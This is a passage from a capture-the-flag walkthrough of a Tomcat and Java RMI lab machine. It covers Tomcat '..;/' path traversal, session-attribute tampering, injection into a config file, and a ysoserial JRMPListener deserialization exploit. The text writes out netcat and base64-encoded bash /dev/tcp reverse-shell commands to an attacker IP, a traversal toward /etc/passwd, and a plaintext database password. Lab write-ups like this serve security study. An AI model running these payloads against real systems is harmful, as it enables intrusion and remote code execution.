I push a modified version of hosting-app to the Docker registry. It would be modified to act as both the RMI registry and RMI server. I then interact with the modified hosting-app to gain RCE Modify the docker image so that it will act as a RMI client, also modified so that it will connect to an RMI registry under my control. Docker Registry Certificate To investigate the first option, I&rsquo;ll need to be able to push and pull from the repo. Using the &ldquo;merge all the blobs&rdquo; method won&rsquo;t be sufficient. I&rsquo;ll test out my configuration by attempting a docker pull of the hosting-app repo, which I already know is present in the Docker registry.
I found the command to pull from the official Docker blog. However, attempting the pull led to a certificate error. First, my Docker client complained that the certificate was untrusted (because it is self-signed):
Error response from daemon: Get &#34;https://10.10.11.223:5000/v2/&#34;: x509: cannot validate certificate for 10.129.229.28 because it doesn&#39;t contain any IP SANs No problem: we can force our local machine to trust the garbage certificate they&rsquo;re handing out. The server must present its certificate on every request. Issuing any cURL request to the Docker registry will force it to present its certificate. You can pass the --verbose flag to curl to see the certificate details. However, to obtain the certificate itself:
curl https://10.10.11.223:5001/auth --insecure -w &#34;%{certs}&#34; -o /dev/null &gt; port5001cert.pem Now extract just the certificate portion of the .pem file, and save it as a .crt file:
tail -n 21 port5001cert.pem &gt; port5001cert.crt then move it to where the certificates normally live, and update the local certificate list:
cp port5001cert.crt /usr/local/share/ca-certificates/ update-ca-certificates Finally, restart docker:
sudo service docker restart Pulling the Image Now that there is a valid certificate, we should be able to perform the docker pull as originally intended:
docker pull 10.10.11.223:5000/hosting-app:latest Error response from daemon: Get &#34;https://10.10.11.223:5000/v2/&#34;: x509: cannot validate certificate for 10.129.229.28 because it doesn&#39;t contain any IP SANs OH! obviously 10.10.11.223 is not in the SANs of the cert&hellip; Let&rsquo;s see what is in there. Opening the .pem file, it is clear that the SAN only contains webhosting.htb. Let&rsquo;s use the host in our docker pull request instead of the IP:
Success! What&rsquo;s even better is that, when I run a container from this image, it has all kind of startup routines; it&rsquo;s running a Tomcat server. To find some more detail:
docker ps # Instance is called &#39;cranky_mclean&#39; docker inspect cranky_mclean This revealed pages and pages of configuration, but some of the more notable server details are below:
OK, so the startup command is catalina.sh, and it should start Tomcat running on port 8080. I think it would be helpful to be able to have an interactive terminal with this docker container (instead of it just spitting out the log file), so I&rsquo;ll try making my own image, with this set as the parent image.
I&rsquo;ll swap out the CMD and move some of my own tools into /tmp. I could also modify hosting.ini this way, if I want the changes to persist when I restart the container. This is the new dockerfile:
# Set the base image FROM webhosting.htb:5000/hosting-app # Copy my toolbox and hosting.ini COPY /STAGING /tmp/Tools COPY hosting.ini /etc/hosting.ini # Set the working directory WORKDIR / # Set the default command to run when starting the container CMD [&#34;/bin/bash&#34;] With the dockerfile complete, I&rsquo;ll build the new image and run it:
docker build -t hosting-app-extra . Note: it is also possible to have root user at the terminal by running this instead:
docker run -it -u root hosting-app-extra Using the new container, I&rsquo;ll start up Tomcat in the background:
catalina.sh run &amp; Pushing an Image Is it possible to push an image to the docker registry? It be useful to know if that is possible, so that I can formulate a plan for attacking/exploiting the target. To test this out, I made a new directory. Inside it, I copied over the existing hosting.ini file, but with a small tweak:
#Mon Jan 30 21:05:01 GMT 2023 mysql.password=O8lBvQUBPU4CMbvJmYqY rmi.host=registry.webhosting.htb mysql.user=root mysql.port=3306 mysql.host=localhost domains.start-template=&lt;body&gt;\\r\\n&lt;h1&gt;It works\\! I edited the start template\\!&lt;/h1&gt;\\r\\n&lt;p&gt;@4wayhandshake&lt;/p&gt;&lt;/body&gt; domains.max=5 rmi.port=9002 This shouldn&rsquo;t change much. Just a different template for index.html when you make a new domain on www.webhosting.htb. I built the container with the existing name (hoping that this will overwrite the current copy) then tried pushing the image:
docker build -t webhosting.htb:5000/hosting-app . docker push webhosting.htb:5000/hosting-app:latest That didn&rsquo;t work. I&rsquo;ll try that again, but with a new image name/tag: hosting-app-tweaked:latest &mdash;&gt; Nope that didn&rsquo;t work either.
It&rsquo;s probably safe to conclude that I cannot push images to the registry.
SQLi Attempt At this point, I&rsquo;m starting to think I&rsquo;m missing some information. Given what I&rsquo;ve already found on the box, I don&rsquo;t really see any way to exploit it. I decided to take a step back (actually more like ten steps back) and re-examine the website itself. Maybe there are some fun web tricks to try.
I went back to the login form at https://www.webhosting.htb/hosting/auth/signin to see if there were any easy ways to login as another user.
After trying a few easily-guessable credentials, I pointed SQLMap at the login form. First, I tried default settings:
sqlmap -u https://www.webhosting.htb/hosting/auth/signin --forms --crawl=2 --batch No results, so I proceeded to I proxy a login attempt through Burp, saved the request as auth-form-post.txt, and pointed SQLMap directly at the login form using that request as a template:
sqlmap -r auth-form-post.txt -p email --force-ssl --batch Still no results.
Path Traversal Remembering that Tomcat has some kind of management panel at /manager/html usually, I tried navigating there directly (not accessible). Then I tried a couple of path traversals (../ or .././ repeated) to get there from /hosting/auth/signin. Still no luck.
Starting to wonder if maybe there was something obvious I hadn&rsquo;t tried, I searched up some common Tomcat credentials and authentication bypasses, which landed me on the Hacktricks page for Tomcat. There, I found a neat path traversal that I had not tried yet: &ldquo;..;/&rdquo;. I knew from exploring the docker container&rsquo;s filesystem that Manager should be adjacent (sibling of) hosting-app, so I used three hops back:
Well how about that! Worked like a charm. The Basic HTTP Authentication form shows that I probably found the management panel! &#x1f601;
I tried a few easily guessable credentials, but none worked. Next, I proxied a login attempt to examine it:
It looks like regular Basic HTTP Authentication using a b64-encoded version of &ldquo;username:password&rdquo;. To try all probable &ldquo;default&rdquo; credentials, I used hydra:
hydra -C $WLIST -s 443 -S &#34;http-get://www.webhosting.htb/hosting/auth/signin/..;/..;/..;/manager/html&#34; -I -VV Unfortunately this also failed. &#x1f914; But maybe this path traversal is useful for more than just the management page. I started trying every directory that would be a sibling to Manager:
Starting from the top, I tried https://www.webhosting.htb/hosting/auth/signin/..;/..;/..;/docs
OK, that&rsquo;s really odd. Why, of all things, would I be redirected to localhost? My browser proxy is off. I turned Burp off, restarted my machine, tried the same request in cURL&hellip; all the resulting in a redirect to 127.0.0.1:8080. But I finally got lucky: when I tried one of the subdirectories of docs I found something!
Very interesting! So I get redirected for /docs but can access the subdirectories. While this page itself is not really of any use, I want to see if this same idea holds true for other directories and their subdirectories. Next, I tried /examples: I was redirected to 127.0.0.1:8080.
&#x1f575;&#xfe0f; While exploring the docker image filesystem for candidates of what might be the best pages to try to access using the path traversal, I came across /webapps/host-manager/WEB-INF/web.xml. Inside, there was some very interesting clues:
&lt;security-constraint&gt; &lt;web-resource-collection&gt; &lt;web-resource-name&gt;HTMLHostManager commands&lt;/web-resource-name&gt; &lt;url-pattern&gt;/html/*&lt;/url-pattern&gt; &lt;/web-resource-collection&gt; &lt;auth-constraint&gt; &lt;!-- NOTE: This role is not present in the default users file --&gt; &lt;role-name&gt;admin-gui&lt;/role-name&gt; &lt;/auth-constraint&gt; &lt;/security-constraint&gt; &lt;!-- Define the Login Configuration for this Application --&gt; &lt;login-config&gt; &lt;auth-method&gt;BASIC&lt;/auth-method&gt; &lt;realm-name&gt;Tomcat Host Manager Application&lt;/realm-name&gt; &lt;/login-config&gt; &lt;!-- Security roles referenced by this web application --&gt; &lt;security-role&gt; &lt;description&gt; The role that is required to log in to the Host Manager Application HTML interface &lt;/description&gt; &lt;role-name&gt;admin-gui&lt;/role-name&gt; &lt;/security-role&gt; &lt;security-role&gt; &lt;description&gt; The role that is required to log in to the Host Manager Application text interface &lt;/description&gt; &lt;role-name&gt;admin-script&lt;/role-name&gt; &lt;/security-role&gt; I don&rsquo;t know yet how this might be useful, but it looks like there are two unexpected roles that a user can have:
admin-gui which lets them into the Host Manager Application HTML interface (seemingly at /host-manager/html/) admin-script which is for the Host Manager Application text interface. However, when I tried the first subfolder of /examples, https://www.webhosting.htb/hosting/panel/..;/..;/examples/jsp, I got a result (completely consistent with the pattern from before: can&rsquo;t access parent dir, can access subdirs), and this result has lots of interesting things:
&#x2615; The best way I can describe JSP is that it&rsquo;s like PHP scripting but for Java. You use it to render dynamic content into a page. JSP is able to run code that is in servlets, which are more like PHP classes.
There is quite a bit on this JSP Examples page. A few of them take user input: it&rsquo;s worth investigating these thoroughly later &#x1f6a9;
Playing with the Session For now, I&rsquo;ll keep exploring subdirectories of /examples and see if anything jumps out at me. I moved on to /examples/servlets, and something stood out to me right away:
Taking a look at the above list, consider what it mentions: Request info, headers, parameters, cookies&hellip; all of these things can be modified client-side from within my own browser - except the Session variables, which are stored server-side. Clicking Execute on on the Sessions item brings me to a form where I can edit session parameters! In the below screenshot, I had already tried submitting the form (with Name of Attribute = &ldquo;role&rdquo;, and a blank Value), then navigated away from and back to this servlet.
This form shows two things: (1) data is persistent as I navigate around, and (2) it is accessing info I can&rsquo;t normally obtain or modify from the browser.
The page also shows me some interesting session variables. The names s_DisplayLoggedInUsernameSafe and s_LoggedInUserUUID could be important. I decided that changing my role for my current session might be advantageous: I knew from reading some of the source code, such as /webapps/host-manager/WEB-INF/web.xml, and from prior knownledge, that the manager-gui role is that is necessary to access /manager/html. Also, a failed login attempt to that page tells the user that this is the case:
Similarly, failing to login to /host-manager/html produces a page that indicates the user is lacking admin-gui - This corresponds to the snippet of xml from /webapps/host-manager/WEB-INF/web.xml that I showed earlier. Hoping that setting these roles onto my current user&rsquo;s session attributes would let me into either of the management panels /manager/html or /host-manager/-html, I set out to use the Session Example servlet to try to do it. I tried all of the following:
role: manager-gui roles: manager-gui role: admin-gui roles: admin-gui No success. To make this less of a guessing-game, I decided to investigate the source code a bit. It seemed like a fair assumption that these session attributes are being set as soon as the user logs in, so I read the code from the decompiled hosting.war file that is important to authentication. Inside /WEB-INF/classes/com/htb/hosting/services/AuthenticationServlet.java I found something that may be useful:
Aha! It looks like the important session attribute might be s_IsLoggedInUserRoleManager. I&rsquo;ll try the Session Example servlet again, setting the value to True. This is the plan:
At https://www.webhosting.htb/hosting/auth/signin, Log in as my fake user, jimbo / jimbo@fake.mail / password Navigate to https://www.webhosting.htb/hosting/panel/..;/..;/examples/servlets/index.html and change my session attribute s_IsLoggedInUserRoleManager = true In the same session, navigate back to https://www.webhosting.htb/hosting/panel It worked! The hosting panel has changed. I now have an extra sidebar item, Configuration &gt; Reconfigure:
The reconfigure panel allows the user to change the template html and number of domains:
The Reconfigure Panel But how does this form work? Assuming it was some jsp form located in the .war file, I went looking for it - I found a file /WEB-INF/jsp/configuration.jsp that seemed right. The source code shows a pretty simple form for setting these two values, and submitting it as a POST.
So what endpoint does it POST to? Again, I searched through the source code for something that seemed right, and found /WEB-INF/classes/com/htb/hosting/services/ConfigurationServlet.java, which revealed something very interesting:
/* */ public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException { /* 31 */ if (!checkManager(request, response)) { /* */ return; /* */ } /* 34 */ Map&lt;String, String&gt; parameterMap = new HashMap&lt;&gt;(); /* */ /* 36 */ request.getParameterMap().forEach((k, v) -&gt; parameterMap.put(k, v[0])); /* */ /* 38 */ Settings.updateBy(parameterMap); /* 39 */ RequestDispatcher rd = request.getRequestDispatcher(&#34;/WEB-INF/jsp/configuration.jsp&#34;); /* 40 */ request.setAttribute(&#34;message&#34;, &#34;Settings updated&#34;); /* 41 */ rd.include((ServletRequest)request, (ServletResponse)response); /* */ } Not only does this confirm that I found the right jsp file, it shows that the endpoint is written in an insecure way! At line 36, it builds a hashmap from request.getParameterMap(), taking all value without validating the object at all. At line 38, Settings.updateBy() is called:
/* */ public static void updateBy(Map&lt;String, String&gt; parameterMap) { /* */ try { /* 19 */ parameterMap.forEach((k, v) -&gt; prop.put(k, v)); /* 20 */ prop.store(new FileOutputStream(Constants.SETTINGS_FILE), (String)null); /* 21 */ } catch (IOException e) { /* 22 */ e.printStackTrace(); /* */ } /* */ } &#x1f920; This means that by sending a modified POST request from that form, I can write any value I want into the hosting.ini file of the live / running hosting app.
But how am I going to use this? I need a plan&hellip;
FOOTHOLD Plan of Attack &#x1f4a1; I think I have an idea. I&rsquo;m going to revisit the second idea I had in the &ldquo;What is Java RMI?&rdquo; section from earlier:
Modify the docker image so that it will act as a RMI client, also modified so that it will connect to an RMI registry under my control.
But I think the missing link in this idea was being able to control hosting.ini remotely on the live webapp. Now, I could point it at my own Java RMI registry, plant a malicious method into the registry, then have the live webapp act as the RMI client like it normally does, but trick it into loading and running the malicious method.
┌ │ │ │ │ └ ─ ─ ─ H R ( ─ ─ o M L ─ ─ s I i ─ ─ t v ─ ─ i C e ─ ─ n l ) ─ ┌ ▼ ─ g i ─ ─ ─ e ─ ─ ─ A n ─ ─ ─ p t ─ ─ ─ p ─ ─ ─ ─ ─ ┐ │ │ │ │ ┘ ─ - ─ - ─ - ─ - ┌ ┤ │ │ │ └ - ─ ─ - ─ R ─ - ─ M U ─ - ─ I n c ─ - ─ d o ─ - ─ R e n ─ - ─ e r t ─ - ─ g r ─ - ─ i m o ─ - ─ s y l ─ - ─ t ─ - ─ r ─ - ─ y ─ - ─ ─ - ┐ │ │ │ │ ┘ - ◄ - ─ - ─ - ─ - ─ ┌ │ │ │ │ └ ─ ─ ─ ─ ─ R ─ ─ ─ M U ─ ─ ─ I n c ─ ─ ─ d o ─ ─ ─ S e n ─ ┐ │ ┴ e r t ─ ─ r r ─ ─ v m o ─ ─ e y l ─ ─ r ─ ─ ─ ┐ │ │ │ │ ┘ I already know that I can use a tool I found earlier (remote method guesser) to act as the RMI server, but I wanted to avoid having to write my own RMI Registry. To find something for it, I searched on Github for &ldquo;Java RMI Registry&rdquo; and the very first result looked perfect: ermir.
The Idea So I&rsquo;ll try creating an RMI registry using ermir, then plant a malicious method onto the registry by using remote method guesser&rsquo;s bind operation. After that, I can edit the hosting.ini file using the Reconfigure panel to point at my malicious RMI registry and load the method.
Constraints The constraints are that the &ldquo;evil&rdquo; method I provide will need to have an identical method signature to one the client is already trying to load - that way mine gets loaded instead. Also, I&rsquo;ll have to make sure that the method is one of the first ones utilized by the RMI client, or it is bound to make the server error-out or crash if it&rsquo;s seeking other, unimplemented methods from my RMI registry.
I also saw in the .war file&rsquo;s source code, in /WEB-INF/classes/com/htb/hosting/rmi/RMIClientWrapper.java, that the rmihost must contain &ldquo;.htb&rdquo;, or rmihost will default to registry.webhosting.htb:
/* 18 */ if (!rmiHost.contains(&#34;.htb&#34;)) { /* 19 */ rmiHost = &#34;registry.webhosting.htb&#34;; /* */ } Execution The final step of all this is to modify hosting.ini on the target to have an address pointing towards an RMI registry that I control. But, as described in the Constraints section above, I need to somehow have this address simultaneously be an IPv4 address but also contain the substring &ldquo;.htb&rdquo;. How is that possible?
To test out ways that I can make this happen, I opened my firewall and set up a netcat listener on port 9002. Then, I proxied the form submission from /reconfigure and added an extra field to the body: rmi.host=XXXX.
sudo ufw allow from $RADDR to any port 9002 proto tcp nc -lvpn 9002 As shown in the image above, I tried all kinds of ways of somehow terminating a string so that, while containing the substring &ldquo;.htb&rdquo; the string is only parsed as the IPv4 address. I tried &ldquo;\\n&rdquo;, &ldquo;\\r\\n&rdquo;, a space, the null character &ldquo;\\0&rdquo;, and all of those in both raw and url-encoded form&hellip; The only response I got from the server was an HTTP 500. At the advice of another HTB user, @TreKar99, I tried the HTML null byte:
Finally, it worked. Why did the HTML null byte work? I still have no idea! &#x1f643;
I&rsquo;ll attempt to do this using ermir. Ermir requires a serialized gadget chain to be specified. It should be as simple as piping the name of the gadget chain into ermir:
Note, ermir also installs gadgetmarshal
gadgetmarshal ysoserial.jar &lt;gadgetchain-name&gt; &lt;command&gt; | ermir --listen 0.0.0.0:9002 --pipe But first, I need to obtain ysoserial.jar. I downloaded a copy from the repo itself, from here. Then I changed its name to just ysoserial.jar.
Then, I needed to figure out a gadget to use. I truly had no idea what would work, so ultimately I just tried them all. To do that effeciently, I copy-pasted the lines from the description on the ysoserial repo on github into a file, then ran awk over it:
awk &#39;{print $1}&#39; ysoserial-payloads.txt &gt; ysoserial-payloadnames.txt This generated a list of all of the payload names, one per line. I tried each one using a command like this:
gadgetmarshal ysoserial.jar &lt;payload-name&gt; &#34;nc 10.10.14.8 4444&#34; | ermir --listen 0.0.0.0:9002 --pipe With every attempt, I was shown an error:
Error [--pipe]: the piped serialized object has a corrupted header. Same issue with a b64 encoded bash reverse shell:
gadgetmarshal ysoserial.jar CommonsCollections7 &#34;bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC44LzQ0NDQgMD4mMSc=}|{base64,-d}|{bash,-i}&#34; | ermir --listen 10.10.14.8:9002 --pipe Well, what&rsquo;s the problem now? That&rsquo;s not very descriptive&hellip; In an attempt to troubleshoot this issue, I tried using ysoserial by itself. Loosely following the instructions from the ysoserial github repo:
&#x1f63f; Really? Ugh&hellip;
I finally found a solution by reading the Issues section of the ysoserial github repo. Long story short, I&rsquo;ve been using OpenJDK 17, but there are known issues with that version. Other folks have had success with OpenJDK 15 and 11. I already had OpenJDK 11 on my system, so I simply changed my environment:
export JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 export PATH=$JAVA_HOME/bin:$PATH java --version # Check the version changed javac --version # Check the version changed With these changes made, it looks like I can finally use ysoserial. Here&rsquo;s an example using the payload CommonsCollections6.
But now I have a deeper issue to solve: how should I use ysoserial? The plan was to use the fact that the target (the RMI client) is going to request FileService from the RMI registry, and that I can affect the target&rsquo;s address for where the registry is located. By standing up my own malicious RMI registry, I should be able to feed the target (RMI client) arbitrary code.
First of all, ysoserial can be used in one of two ways:
java -jar ysoserial.jar &lt;payload&gt; &lt;cmd&gt; This generates a payload, to be sent (possibly unsolicited) to the target java -cp ysoserial.jar &lt;exploit&gt; &lt;exploitargs&gt; This runs an existing ysoserial exploit: there are about a dozen. Given my use-case, it makes sense to use one the listener exploits within ysoserial. You can check here to see the source code for the three listener exploits; they each have some comments that describe their usage. For this situation, the best choice looked like JRMPListener, which listens for an RMI call then replies with a message containing the payload. I&rsquo;ll try running this listener:
Huh? Man, Java is really annoying for these obscure errors. Maybe I should have found a docker image or something&hellip;
After a bit of research, I found out that this is due to some kind of incompatibility, but can be fixed by adding a JVM run flag --add-open java.base/java.util=ALL-UNNAMED. What took me a while to figure out is that this flag must be placed at the beginning of the command, right after java:
Sorry for the extra-wide image &#x1f62c;
After the listener was running, I went to trigger the exploit. Just to recap, this involved interacting with the target:
At https://www.webhosting.htb/hosting/auth/signin, Log in as my fake user, jimbo / jimbo@fake.mail / password Navigate to https://www.webhosting.htb/hosting/panel/..;/..;/examples/servlets/index.html and change my session attribute s_IsLoggedInUserRoleManager = true In the same session, navigate back to https://www.webhosting.htb/hosting/panel Then, having logged in with permissions to access /reconfigure, I proxied the request to reconfigure and used it to edit hosting.ini to point to my ysoserial listener. Then, to trigger the exploit, we need to get the target to request the FileService method (one of the times it does this is when a user creates a new domain), so I create a new domain. As soon as I did that, I saw the target contact my RMI registry (the ysoserial listener)!
Another error&hellip; Similar though, at least. I&rsquo;ll try a similar fix:
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED -cp ysoserial.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 &#34;nc 10.10.14.8 4444&#34; Then, triggering the exploit in the same way led to the following:
Again? I must have not added the correct flag. I&rsquo;ll try like this:
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.lang/javax.management=ALL-UNNAMED -cp ysoserial.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 &#34;nc 10.10.14.8 4444&#34; At this point, I realized I was accidentally running OpenJDK 17 again, so I switched back to OpenJDK 11.
I tried running again, but this time with the --illegal-access=permit flag, then triggering the exploit once again:
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --illegal-access=permit -cp ysoserial.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 &#34;nc 10.10.14.8 4444&#34; &#x1f389; YES! finally!!! Some success. The target contacted my RMI registry (the ysoserial listener), which deployed a payload to have the target contact my netcat listener, and netcat was contacted!
That&rsquo;s a very weak remote code execution - let&rsquo;s see if we can create a reverse shell using the same method. First, I&rsquo;ll try modifying it into a simple nc reverse shell:
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --illegal-access=permit -cp ysoserial.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 &#34;nc 10.10.14.8 4444 -e /bin/sh&#34; Triggering the exploit in the same way&hellip;
&#x1f34d; Success!! That&rsquo;s a reverse shell &#x1f601;
USER FLAG User Enumeration: app Checking /etc/passwd, it looks like the current user, app is the only user with a home directory. I suppose this is unsurprising: this isn&rsquo;t a multi-user environment, it&rsquo;s just a docker container. In addition, there are very few tools available: no scripting languages etc.
Even simple attempts to upgrade my shell are not successful.
On my attacker machine, I set up a simple python3 http server so that, from the target machine, I could download my toolbox. After transferring my tools, I ran linpeas and recorded the output into a file:
./linpeas.sh -a &gt; ./linpeas-out.txt Then I set up a second nc listener on my attacker box, and transferred the linpeas output from the target to my attacker machine, where I can view it comfortably.
nc -lvnp 4445 &gt; linpeas-out.txt # On attacker nc -nv 10.10.14.8 4445 &lt; linpeas-out.txt # On target less -r linpeas-out.txt # On attacker Near the top of linpeas was a very clear suggestion of path abuse:
Path abuse only works if there is a way to make root execute something, though.
There were two things that I was somewhat &ldquo;locked-out&rdquo; of as a remote user:
access to /etc/hosts to resolve registry.webhosting.htb to my own IP address instead of localhost This way, I won&rsquo;t need to keep triggering the exploit in the same way if I need it again. write access to tomcat-users.xml to give myself access to the management and admin panels. For the second point, I downloaded tomcat-users.xml to my attacker machine, and edited it:
Then I returned the file to the target machine via my python http server. However, upon attempting both /manager/html and /host-manager/html I realized that this change to tomcat-users.xml had no effect.
Next, I&rsquo;ll check out the MySQL database that I found credentials for, much earlier ( root : O8lBvQUBPU4CMbvJmYqY).
mysql -u root -pO8lBvQUBPU4CMbvJmYqY -e &#34;SHOW DATABASES&#34; Nope, nothing.
OK, let&rsquo;s see what ports the target is listening on:
Hmm. The externally-exposed port 3310 is a surprise. And I&rsquo;m not sure what 8009 is about, either. Port 9002 must be the RMI registry (registry.webhosting.htb).
I&rsquo;ve tried several tools inside this docker container that all seem to fail. I think it&rsquo;s because of this dumb shell.
Ex. Running pspy and redirecting to a file produced no output. I also tried enumerating the RMI registry using remote-method-guesser but I get no output.
Since my shell was so poor, I decided to rebuild it using a different reverse shell. After a few tries with different things, I eventually had success using a base-64 encoded Bash -i reverse shell and a socat listener:
java --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.base/java.lang=ALL-UNNAMED --illegal-access=permit -cp ysoserial.jar ysoserial.exploit.JRMPListener 9002 CommonsCollections6 &#34;bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjgvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}&#34; socat -d -d TCP-LISTEN:4444 STDOUT Then triggered the RMI exploit in the exact same way. Now I have a much better, interactive shell:
RMI Registry - Enumeration The big idea here is that I might be able to leak file contents by using FileService. We already know that FileService is used inside the hosting app, presumably for the various file operations it performs (listing files within the domain, etc). Even being inside the live docker container running that webapp, I haven&rsquo;t seen where these domains are stored - so there&rsquo;s a good chance they&rsquo;re actually stored on host system &#x1f91e; Therefore, FileService might be able to access files on the host system.
Now that my shell can finally run java, I&rsquo;ll transfer over one of the tools for enumerating RMI: remote-method-guesser, available from its repo on Github. I served the jar file to the target box, then ran it. First, I tried the guess function, which gave no result. Next, I tried the vulnerability-scanning enum mode:
Excellent! We can see FileService which we were expecting. I&rsquo;m not sure what QuarantineService is about yet. From analyzing the source code earlier, it was apparent that FileService is for listing files in a directory, making directories, viewing file contents, etc:
There are zero comments in this interface (Bad developer!), and the parameter names are useless, so we can investigate what the actual method signatures are by seeing places in the code where the methods are called. For this, I used the Search feature of JD-GUI. For example, list() is used in a couple places:
Checking out the actual method call of list() inside FileUtil shows what the parameters actually are:
public static List&lt;AbstractFile&gt; displayListFiles(Domain domain, String path) { try { return RMIClientWrapper.get().list(domain.getVhost(), path); } catch (RemoteException e) { e.printStackTrace(); return new ArrayList&lt;&gt;(); } } The first parameter is the vhost and the other is the path. Both are String objects.
Repeating the same process for view() we can get an idea of that function signature too. Note that we want the one that throws RemoteException (indicating that&rsquo;s the method held in the RMI registry):
... int c = ((new String(RMIClientWrapper.get().view(safeFile.getFileRef()))).split(&#34;\\n&#34;)).length; ... In short, it takes a one parameter: a filepath as a String.
RMI Registry - Viewing Files With all that known, I think it&rsquo;s finally possible to try using the call operation of remote-method-guesser. However, according to the documentation on its Github repo, I&rsquo;ll need to bundle it with a plugin first, or else no output will be displayed. Thankfully, a sample plugin is provided that basically spits out anything sent to stdout, so I&rsquo;ll try using that.
From the remote-method-guesser directory, bundle the plugin into a jar file. If you&rsquo;re copy-pasting, be sure to update the version number with whatever your copy uses:
bash plugins/build.sh target/rmg-4.4.1-jar-with-dependencies.jar plugins/GenericPrint.java GenericPrint.jar Then serve GenericPrint.jar to the target (again, I used my python webserver) and try running it:
wget http://10.10.14.8:8000/GenericPrint.jar java -jar rmg.jar call 127.0.0.1 9002 &#39;list 53106895b73e &#34;/&#34;&#39; --signature &#34;List&lt;AbstractFile&gt; list(String paramString1, String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService &#x1f922; Ok, I guess I need to compile GenericPrint.jar using JDK version 8&hellip; here we go again!
export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_381 export PATH=$JAVA_HOME/bin:$PATH bash plugins/build.sh target/rmg-4.4.1-jar-with-dependencies.jar plugins/GenericPrint.java GenericPrint.jar mv GenericPrint.jar ~/Box_Notes/RegistryTwo/ Download again, and try running again:
rm GenericPrint.jar wget http://10.10.14.8:8000/GenericPrint.jar java -jar rmg.jar call 127.0.0.1 9002 &#39;list 53106895b73e &#34;/&#34;&#39; --signature &#34;List&lt;AbstractFile&gt; list(String paramString1, String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService Hmm, it now it doesn&rsquo;t like the method signature. Here&rsquo;s some stuff I tried:
java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;,&#34;/&#34;&#39; --signature &#34;List&lt;AbstractFile&gt; list(String paramString1, String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService # Nope java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;&#39; --signature &#34;List&lt;AbstractFile&gt; list(String paramString1 String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService # Nope java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;&#39; --signature &#34;List list(String paramString1 String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService # Nope java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;&#39; --signature &#34;String list(String paramString1 String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService # Now it&#39;s complaining about number of arguments --&gt; List was probably the problem java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;, &#34;/&#34;&#39; --signature &#34;String list(String paramString1 String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService #[-] Caught UnmarshalException (unrecognized method hash) during call action. #[-] The specified method signature String list(String paramString1 String paramString2) is not supported by the remote object. #[-] Cannot continue from here. java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;, &#34;/&#34;&#39; --signature &#34;java.util.List list(String paramString1 String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService bash-4.4$ java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;53106895b73e&#34;, &#34;/&#34;&#39; --signature &#34;java.util.List list(String paramString1 String paramString2)&#34; --plugin GenericPrint.jar --bound-name FileService &lt; --plugin GenericPrint.jar --bound-name FileService #[+] Caught java.rmi.UnmarshalException during generic call action. #[+] The call was probably successful, but caused an exception on the server side. #[-] StackTrace: #java.rmi.UnmarshalException: error unmarshalling return; nested exception is: # java.lang.ClassNotFoundException: com.htb.hosting.rmi.AbstractFile (no security manager: RMI class loader disabled) # at de.qtc.rmg.networking.RMIEndpoint.unmanagedCall(RMIEndpoint.java:252) # at de.qtc.rmg.networking.RMIEndpoint.genericCall(RMIEndpoint.java:113) #... # at de.qtc.rmg.operations.Operation.invoke(Operation.java:331) # at de.qtc.rmg.Starter.main(Starter.java:26) #Caused by: java.lang.ClassNotFoundException: com.htb.hosting.rmi.AbstractFile (no security manager: RMI class loader disabled) #... I looked through the remote-method-guesser source code to see what was going wrong: all I really discovered was that you should not have any commas in the method signature. That, and that it doesn&rsquo;t play nice with non-primitive types.
OK, so attempting to list the files didn&rsquo;t go so well&hellip; But what about the view operation? Can I make that work? Here&rsquo;s my initial attempt:
java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;index.html&#34;&#39; --signature &#34;byte[] view(String paramString)&#34; --plugin GenericPrint.jar --bound-name FileService &ldquo;probably successful&rdquo;?! Well that sounds pretty close! Maybe it&rsquo;s just the filepath that&rsquo;s wrong? I&rsquo;ll try a path traversal to a file that must exist:
I already saw in the source code that relative paths are accepted, and it didn&rsquo;t seem like there were any limitations on where the path could point.
java -jar rmg.jar call 127.0.0.1 9002 &#39;&#34;/../../../../../../../etc/passwd&#34;&#39; --signature &#34;byte[] view(String paramString)&#34; --plugin GenericPrint.jar --bound-name FileService &ndash;&gt; Resulted in the same NullPointerException
Trying to troubleshoot this led me to investigating how the hosting app normally views a file. I opened the web app in my browser, logged in with my usual user, went to an existing domain and clicked on the index.html file to view it&hellip;
You might think you&rsquo;d that the app would send a GET request to something like this: https://webhosting.htb/view/&lt;domain&gt;/&lt;relative-filepath&gt; (or something like that)
But instead, it&rsquo;s actually requesting something like this: https://www.webhosting.htb/hosting/view/&lt;long base-64 encoded value&gt;
The reason is that the filename is being encrypted. As such, we must include CryptUtils
